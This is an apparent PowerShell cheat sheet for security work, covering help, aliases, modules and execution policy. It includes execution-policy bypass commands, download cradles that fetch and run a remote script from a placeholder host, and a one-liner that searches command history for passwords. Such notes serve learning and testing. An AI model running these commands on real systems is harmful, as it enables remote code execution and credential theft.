# Help System
`Get-Help Get-Process`
`help Get-Process`
`Update-Help`

`Get-Help remoting`
`Get-Help about_*remot*`

`Get-Command -CommandTyle Cmdlet`

# Basic Constructs

Cmdlets
Function

# Aliases

`Get-Alias -Name ps`
`Get-Alias -Definition Get-Process`

# Execution Policy

* Not a security feature
* Used to avoid accidental script execution
* Can be bypass with:
  * `powershell -executionpolicy bypass .\example.ps1`
  * `powershell -c <cmd>`
  * `powershell -enc`

# Modules

`Import-Module <path_to_module> -verbose`
`Get-Module -ListAvailable`
`Get-Command -Module <module_name>`

# Remote Script execution

* `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
* `iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
* `powershell -EncodedCommand <Base64EncodedCommand>`

* Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter

# Command History (PSReadline)

```
cat (Get-PSReadlineOption).HistorySavePath | sls password
```
By default, the path is:
```
profile:\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

# Execution Policy

> https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6

# Collection of Scripts

- https://sid-500.com/downloads/
- Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter&utm_medium=social&utm_content=peerlyst_post&utm_campaign=peerlyst_shared_post
- Mayhem scripts: https://gist.github.com/M3T4L5T3F
- Collection of PowerShell network security scripts for system administrators.: https://github.com/thom-s/netsec-ps-scripts

# Resources

- PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw
